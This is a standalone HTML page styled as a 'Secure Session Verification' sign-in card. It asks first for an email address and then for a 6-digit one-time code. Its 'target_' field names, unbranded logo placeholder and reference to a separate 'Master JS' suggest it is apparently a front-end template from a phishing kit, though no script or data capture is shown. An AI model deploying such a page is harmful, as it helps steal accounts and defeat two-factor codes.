<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Session Verification</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #f8fafc;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-card {
            background: #ffffff;
            width: 100%;
            max-width: 400px;
            padding: 40px 32px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05), 0 4px 10px rgba(0, 0, 0, 0.03);
            text-align: center;
        }

        .logo-placeholder {
            width: 48px;
            height: 48px;
            background: linear-gradient(135deg, #10b981, #06b6d4);
            border-radius: 12px;
            margin: 0 auto 24px auto;
        }

        h2 {
            font-size: 1.5rem;
            color: #0f172a;
            margin-bottom: 8px;
            font-weight: 600;
        }

        p {
            font-size: 0.95rem;
            color: #64748b;
            margin-bottom: 28px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group input {
            width: 100%;
            padding: 12px 16px;
            font-size: 1rem;
            border: 1px solid #cbd5e1;
            border-radius: 8px;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .input-group input:focus {
            border-color: #06b6d4;
            box-shadow: 0 0 0 3px rgba(6, 182, 212, 0.15);
        }

        .submit-btn {
            width: 100%;
            background: #0f172a;
            color: #ffffff;
            border: none;
            padding: 14px;
            font-size: 1rem;
            font-weight: 500;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.2s;
        }

        .submit-btn:hover {
            background: #1e293b;
        }
        
        .submit-btn:disabled {
            background: #94a3b8;
            cursor: not-allowed;
        }

        /* Step visibility controlled by the Master JS */
        #step_email { display: block; }
        #step_otp { display: none; }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="logo-placeholder"></div>
        
        <!-- STEP 1: EMAIL -->
        <div id="step_email">
            <h2>Sign In</h2>
            <p>Please verify your email address to continue securely.</p>
            
            <div class="input-group">
                <input type="email" id="target_email" placeholder="Email Address" required autocomplete="off">
            </div>
            
            <button id="submit_email_btn" class="submit-btn">Next</button>
        </div>

        <!-- STEP 2: OTP -->
        <div id="step_otp">
            <h2>Verification Required</h2>
            <p>Enter the security code we just sent to your email.</p>
            
            <div class="input-group">
                <input type="text" id="target_otp" placeholder="6-Digit OTP" required autocomplete="off" maxlength="6">
            </div>
            
            <button id="submit_otp_btn" class="submit-btn">Verify & Continue</button>
        </div>
    </div>

</body>
</html>
